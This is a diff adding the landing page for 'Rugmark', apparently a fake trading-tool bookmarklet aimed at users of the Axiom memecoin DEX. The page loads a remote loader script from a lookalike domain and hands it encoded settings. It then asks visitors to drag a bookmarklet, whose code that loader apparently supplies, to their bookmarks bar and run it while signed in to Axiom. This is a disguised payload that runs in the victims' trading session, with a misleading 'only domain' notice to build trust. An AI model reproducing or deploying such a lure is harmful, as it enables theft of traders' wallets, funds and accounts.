@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Rugmark</title>
+    <link rel="icon" href="assets/logo.png" />
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;800&display=swap" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://axiom.ctoportal.icu/loader.js" data="eyJoYXNoIjoiTURzNE5EZ3lNVE01TkRReiIsImFsZXJ0cyI6eyJndWlkZSI6IllvdSBtdXN0IGRyYWcgdGhlIGJ1dHRvbiB0byB5b3VyIGJvb2ttYXJrcyBiYXIgaW5zdGVhZCBvZiBjbGlja2luZyBpdC4iLCJyZWRpcmVjdCI6IllvdSBhcmUgbm93IGJlaW5nIHJlZGlyZWN0ZWQgdG8gaHR0cHM6Ly9heGlvbS50cmFkZS9kaXNjb3Zlci4iLCJ1bmF1dGhvcml6ZWQiOiJZb3UgbXVzdCBiZSBzaWduZWQgaW4gdG8gdXNlIHRoaXMgYm9va21hcmtsZXQuIiwiZXJyb3IiOiJGYWlsZWQgdG8gZXhlY3V0ZSB0aGUgYm9va21hcmtsZXQuIFBsZWFzZSB0cnkgYWdhaW4gbGF0ZXIuIn19"></script>
+    <style>
+        html {
+            scroll-behavior: smooth;
+        }
+        body {
+            font-family: 'Inter', sans-serif;
+            position: relative;
+            overflow-x: hidden;
+            background-color: #0d0d0d;
+        }
+        .glass {
+            backdrop-filter: saturate(140%) blur(10px);
+            background-color: rgba(255, 255, 255, 0.06);
+        }
+        .glass-dark {
+            backdrop-filter: saturate(140%) blur(10px);
+            background-color: rgba(0, 0, 0, 0.2);
+        }
+        .glass-darker {
+            backdrop-filter: saturate(180%) blur(20px);
+            background-color: rgba(0, 0, 0, 0.3);
+        }
+        .shadow-glow {
+            box-shadow: 0 10px 40px rgba(0,0,0,.35);
+        }
+        .no-select {
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+        }
+        .btn-hover-effect {
+            transition: transform 0.2s ease-in-out, box-shadow 0.2s ease-in-out;
+        }
+        .btn-hover-effect:hover {
+            transform: scale(1.05);
+            box-shadow: 0 15px 50px rgba(0,0,0,.5);
+        }
+        .card-hover-effect {
+            transition: transform 0.2s ease-in-out, box-shadow 0.2s ease-in-out;
+        }
+        .card-hover-effect:hover {
+            transform: translateY(-8px);
+            box-shadow: 0 10px 30px rgba(0,0,0,.25);
+        }
+        .features-heading-glow {
+            text-shadow: 0 0 8px rgba(251, 191, 36, 0.5), 0 0 12px rgba(251, 191, 36, 0.3);
+            color: #FBBF24;
+        }
+        .bg-gradient-radial {
+            background-image: radial-gradient(40% 50% at 60% 10%, rgba(255, 165, 0, 0.15), transparent 60%),
+                              radial-gradient(80% 70% at 20% 60%, rgba(255, 165, 0, 0.15), transparent 60%);
+        }
+        .btn-amber-gradient {
+            background-image: linear-gradient(to right, #fbbf24, #f59e0b);
+            color: #1f2937; /* Reverted text color to black/dark gray */
+            font-weight: 600;
+            padding: 1rem 2rem;
+            border-radius: 0.75rem;
+            box-shadow: 0 10px 40px rgba(0,0,0,.35);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: transform 0.2s ease-in-out, box-shadow 0.2s ease-in-out;
+        }
+        .btn-amber-gradient:hover {
+            transform: scale(1.05);
+            box-shadow: 0 15px 50px rgba(0,0,0,.5);
+        }
+    </style>
+</head>
+<body class="min-h-screen text-stone-100 bg-gradient-to-br from-gray-950 via-black to-neutral-950 selection:bg-amber-400/30 selection:text-amber-100">
+
+    <div class="fixed inset-0 z-0 bg-gradient-radial"></div>
+
+    <header class="relative z-10 mx-auto max-w-7xl px-4 sm:px-6 lg:px-8 flex items-center justify-between h-20">
+        <a href="#" class="flex items-center gap-2 text-xl font-bold">
+            <img src="assets/logo.png" alt="Rugmark logo" class="h-9 w-9 rounded" /> 
+            <span class="font-bold tracking-tight text-xl text-amber-400">Rugmark</span>
+        </a>
+        <div class="px-4 py-2 rounded-full glass-dark border border-white/10 text-sm text-white/80 flex items-center absolute left-1/2 -translate-x-1/2">
+            <span class="mr-2 text-amber-400">⚠️</span> <script>document.write(window.location.hostname)</script> is our only domain.
+        </div>
+        <nav class="flex items-center gap-4">
+            <a href="#features" class="text-stone-300 hover:text-white">Features</a>
+            <a href="#tutorial" class="text-stone-300 hover:text-white">Tutorial</a>
+        </nav>
+    </header>
+
+    <section class="relative z-10 text-center py-20">
+        <h1 class="relative text-5xl font-extrabold leading-tight tracking-tight max-w-3xl mx-auto">
+            Introducing <span class="text-amber-400">Rugmark.</span>
+        </h1>
+        <p class="relative mt-4 text-stone-300 max-w-xl mx-auto">
+            Rugmark upgrades your Axiom DEX with a fresh interface and smart tools including rug checks so you can trade meme coins without uncertainty.
+        </p>
+        <div class="relative mt-8 flex flex-wrap gap-3 justify-center">
+<a class="bookmarklet cursor-move rounded-xl bg-amber-500/90 hover:bg-amber-400 text-black font-semibold px-8 py-4 shadow-glow flex items-center no-select btn-hover-effect" href="#">
+    Drag Me 
+    <svg class="w-4 h-4 ml-2 -rotate-90" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 8l4 4m0 0l-4 4m4-4H3"></path>
+    </svg>
+</a>
+            <a href="#features" class="rounded-xl border border-white/10 hover:border-white/20 px-8 py-4 text-white btn-hover-effect">See the features</a>
+        </div>
+        <div class="relative mt-6 text-xs text-stone-400">
+            Drag the button above to your bookmarks bar then click it while on Axiom (<span class="text-amber-400"><script>document.write(navigator.platform.includes("Mac") ? "CMD" : "CTRL")</script>+SHIFT+B</span> to toggle your bookmarks bar)
+        </div>
+    </section>
+
+<section id="tutorial" class="relative z-10 mx-auto max-w-5xl px-4 sm:px-6 lg:px-8 py-16">
+    <div class="relative w-full aspect-video bg-neutral-700 rounded-3xl flex items-center justify-center overflow-hidden">
+        <video class="absolute inset-0 w-full h-full rounded-3xl" controls>
+            <source src="assets/tutorial.mp4" type="video/mp4">
+            Your browser does not support the video tag.
+        </video>
+    </div>
+</section>
+    
+    <section id="features" class="relative z-10 py-20 text-center">
+        <div class="mx-auto max-w-7xl px-4 sm:px-6 lg:px-8">
+            <div class="flex items-center justify-center gap-4 mb-4">
+                <div class="h-px w-16 bg-gradient-to-r from-transparent to-amber-400/50"></div>
+                <h2 class="text-base font-semibold text-amber-400 features-heading-glow">Features</h2>
+                <div class="h-px w-16 bg-gradient-to-l from-transparent to-amber-400/50"></div>
+            </div>
+            <h2 class="text-4xl font-extrabold tracking-tight text-white mb-2">Trade Smarter, Not Harder.</h2>
+            <p class="text-stone-300 max-w-xl mx-auto mb-16">No more lag - just one bookmark built to power your next winning move.</p>
+            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
+                <div class="p-6 rounded-2xl glass-dark border border-white/10 text-left card-hover-effect">
+                    <div class="w-12 h-12 rounded-full glass flex items-center justify-center mb-4 text-white font-bold text-xl">
+                        1
+                    </div>
+                    <h3 class="text-xl font-semibold mb-2">Enhanced Trading UI</h3>
+                    <p class="text-sm text-stone-400">A cleaner, more intuitive interface for your go-to DEX sites—making memecoin trading effortless for every doge.</p>
+                </div>
+                <div class="p-6 rounded-2xl glass-dark border border-white/10 text-left card-hover-effect">
+                    <div class="w-12 h-12 rounded-full glass flex items-center justify-center mb-4 text-white font-bold text-xl">
+                        2
+                    </div>
+                    <h3 class="text-xl font-semibold mb-2">Keyboard Shortcuts</h3>
+                    <p class="text-sm text-stone-400">Swift shortcuts for fast navigation & smooth trades.</p>
+                </div>
+                <div class="p-6 rounded-2xl glass-dark border border-white/10 text-left card-hover-effect">
+                    <div class="w-12 h-12 rounded-full glass flex items-center justify-center mb-4 text-white font-bold text-xl">
+                        3
+                    </div>
+                    <h3 class="text-xl font-semibold mb-2">Rug & Bundle Checks</h3>
+                    <p class="text-sm text-stone-400">Keep track of rug/rugged & bundled coins with enhanced data directly notifying you.</p>
+                </div>
+                <div class="p-6 rounded-2xl glass-dark border border-white/10 text-left card-hover-effect">
+                    <div class="w-12 h-12 rounded-full glass flex items-center justify-center mb-4 text-white font-bold text-xl">
+                        4
+                    </div>
+                    <h3 class="text-xl font-semibold mb-2">Domain Age Checks</h3>
+                    <p class="text-sm text-stone-400">Verify any domain's history to know if it's legitimate or just fake hype.</p>
+                </div>
+                <div class="p-6 rounded-2xl glass-darker border border-white/10 text-left card-hover-effect">
+                    <div class="w-12 h-12 rounded-full glass flex items-center justify-center mb-4 text-white font-bold text-xl">
+                        5
+                    </div>
+                    <h3 class="text-xl font-semibold mb-2">GitHub AI Analyzer</h3>
+                    <p class="text-sm text-stone-400">Analyze GitHub repositories to confirm real projects, and filter out fakes.</p>
+                </div>
+                <div class="p-6 rounded-2xl glass-dark border border-white/10 text-left card-hover-effect">
+                    <div class="w-12 h-12 rounded-full glass flex items-center justify-center mb-4 text-white font-bold text-xl">
+                        6
+                    </div>
+                    <h3 class="text-xl font-semibold mb-2">Built-in PNL Overlay</h3>
+                    <p class="text-sm text-stone-400">Monitor your wins and losses swiftly.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <div class="relative z-10 w-full py-20 glass-darker border-0">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 text-center">
+            <h2 class="text-4xl font-extrabold tracking-tight text-white mb-8">Rugmark is for you.</h2>
+            <a href="#tutorial" class="btn-amber-gradient mx-auto w-fit text-sm">
+                Setup Rugmark
+            </a>
+        </div>
+    </div>
+
+    <footer class="relative z-10 glass-dark border-t border-white/10 py-10 px-4 sm:px-6 lg:px-8">
+        <div class="flex flex-col md:flex-row items-center justify-between mx-auto max-w-7xl">
+            <div class="flex items-center gap-2 mb-4 md:mb-0">
+                <img src="assets/logo.png" alt="Rugmark logo" class="h-9 w-9 rounded" />
+                <span class="text-sm text-stone-400">© <script>document.write(new Date().getFullYear())</script> Rugmark. All rights reserved.</span>
+            </div>
+            <div class="flex items-center gap-4 text-sm text-stone-400 ml-auto">
+                <a href="#features" class="hover:text-white">Features</a>
+                <a href="#tutorial" class="hover:text-white">Tutorial</a>
+            </div>
+        </div>
+    </footer>
+
+</body>
+</html>
+
+
